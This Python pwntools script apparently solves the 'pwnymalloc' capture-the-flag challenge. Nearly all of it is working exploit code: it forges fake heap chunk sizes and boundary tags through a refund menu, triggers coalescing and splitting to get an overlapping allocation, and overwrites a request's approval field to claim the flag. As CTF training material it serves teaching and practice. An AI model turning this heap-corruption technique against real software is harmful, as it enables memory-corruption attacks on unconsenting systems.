#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("pwnymalloc.chal.uiuc.tf", 1337, ssl = True)

    return r


def refund(amount: int, payload: bytes):
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b":", str(amount).encode("ascii"))
    r.sendafter(b":", payload)


def complaint(text: str):
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b":", text.encode("ascii"))


def check_status(id: int):
    r.sendlineafter(b">", b"4")
    r.sendlineafter(b":", str(id).encode("ascii"))


def main():
    r = conn()

    # Build fake chunk (this results in a smaller fake chunk (0xa0) in the memory layout).
    payload = flat(
                    b"A" * 0x20,
                    p64(0x0),
                    p64(0xa0),          # btag (basically the end for the first chunk).
                    p64(0xa0),          # size (fake chunk).
                    b"\x00" * 0x4f      # Padding (-1 byte to include newline).
                )

    refund(1, payload)

    # Set the btag for the about-to-be-coalesced chunk.
    payload = flat(
                    p64(0x00) * 0x0f,
                    b"\xe0",           # btag (fake chunk; used in prev_chunk function).
                    b"\x00" * 6        # Padding (-1 byte to include newline).
                )

    refund(1, payload)

    # After this the chunk will be coalesced with the previous one into a bigger chunk.
    # The complain will be allocated at 0x...120 and the btag of previous block will result as 0xe0.
    # So the previous chunk will start at 0x...040 and will have a size of 0xa0.
    # Once coalesced it will have a size of 0xf0.
    complaint("A")

    # The request has size 0x90 while the biggest free chunk has size 0xf0.
    # This means that it will be splitted in two smaller chunks of sizes 0x90 and 0x60.
    # Now we have a chunk that overlaps with the second request we have made.
    # We need to overwrite the request's approval field with the value "1".
    payload = flat(
                    p64(0x00) * 8,      # Padding
                    p64(0x91),          # Correct size of the request (with status bit = INUSE)
                    p32(1),             # "Approved" bit
                    p32(1),             # Amount
                    b"\x00" * 0x2f      # Padding
                )

    refund(1, payload)

    check_status(1)
    log.success(f"Flag obtained: {r.recvlinesS(4)[-1]}")


if __name__ == "__main__":
    main()
